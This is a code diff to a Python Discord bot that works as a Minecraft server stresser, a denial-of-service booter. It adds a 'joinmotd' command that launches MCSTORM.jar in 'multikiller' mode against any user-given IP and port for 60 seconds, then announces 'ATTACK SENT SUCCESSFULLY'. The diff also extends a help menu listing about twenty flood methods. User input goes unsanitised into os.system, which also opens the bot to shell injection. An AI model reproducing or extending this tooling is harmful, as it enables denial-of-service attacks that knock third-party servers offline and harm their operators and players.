@@ -673,6 +673,32 @@ async def bypasshub(ctx, arg1, arg2):
 
 @client.command()
 
+async def joinmotd(ctx, arg1, arg2):
+    if arg1 == '1.1.1.1':
+        await ctx.send('You cant attack 1.1.1.1')
+        pass
+    else:
+        def attack():
+            os.system(f"java -Dprefix="DreamBot" -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1} {arg2} multikiller 60 -1")
+            os.system(f"")
+
+        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
+
+        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
+        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``bypasshub``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
+        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
+        embed.set_thumbnail(
+        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
+    
+        embed.set_footer(text="𝗗𝗶𝗯𝗯𝗼'𝘀 𝗟𝗮𝗶𝗿 | 𝗗𝗶𝗯𝗯𝗼")
+        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
+        t1 = threading.Thread(target=attack)
+
+        t1.start()
+        await ctx.send(embed=embed)
+
+@client.command()
+
 async def spammer(ctx, arg1, arg2):
     if arg1 == '1.1.1.1':
         await ctx.send('You cant attack 1.1.1.1')
@@ -847,7 +873,7 @@ async def methods(ctx):
         title=":fleur_de_lis: 𝙈𝙀𝙏𝙃𝙊𝘿𝙎 :fleur_de_lis:",
         color=discord.Colour.green(), timestamp= ctx.message.created_at
     )
-    embed.add_field(name=f'𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗿𝗲𝘀𝘀𝗲𝗿', value='$cpudowner <ip:port> <protocol> \n $downshield <ip:port> <protocol> \n $rameater <ip:port> <protocol> \n $byte <ip:port> <protocol> \n $storm <ip:port> <protocol> \n  $waterbum <ip:port> <protocol> \n $bypasshub <ip:port> <protocol> \n $ultimatekiller <ip:port> <protocol> \n $extremekiller <ip:port> <protocol> \n $spammer <ip:port> <protocol> \n $aegis <ip:port> <protocol> \n $cpup <ip:port> <protocol> \n $emotialdamage <ip:port> <protocol> \n $tcpkiller <ip:port> <protocol> \n $brutalcpu <ip:port> <protocol> \n $cpufucker <ip:port> <protocol> \n $nullping <ip> <port> <protocol> \n $abdeluxe <ip> <port> <protocol> \n $flamecord <ip> <port> <protocol>' ,inline=False)
+    embed.add_field(name=f'𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗿𝗲𝘀𝘀𝗲𝗿', value='$cpudowner <ip:port> <protocol> \n $downshield <ip:port> <protocol> \n $rameater <ip:port> <protocol> \n $byte <ip:port> <protocol> \n $storm <ip:port> <protocol> \n  $waterbum <ip:port> <protocol> \n $bypasshub <ip:port> <protocol> \n $ultimatekiller <ip:port> <protocol> \n $extremekiller <ip:port> <protocol> \n $spammer <ip:port> <protocol> \n $aegis <ip:port> <protocol> \n $cpup <ip:port> <protocol> \n $emotialdamage <ip:port> <protocol> \n $tcpkiller <ip:port> <protocol> \n $brutalcpu <ip:port> <protocol> \n $cpufucker <ip:port> <protocol> \n $nullping <ip> <port> <protocol> \n $abdeluxe <ip> <port> <protocol> \n $flamecord <ip> <port> <protocol> \n $joinmotd <ip:port> <protocol>' ,inline=False)
     embed.add_field(name=f'𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗿𝗲𝘀𝘀𝗲𝗿 2 (for $attack) - $attack <ip:port> <protocol> <method>', value=', '.join([i for i in methods_list]), inline=True)
     embed.add_field(name=f'𝗟𝗮𝘆𝗲𝗿𝟰', value='coming soon', inline=False)
     embed.add_field(name=f'𝗟𝗮𝘆𝗲𝗿𝟳', value='coming soon', inline=False)
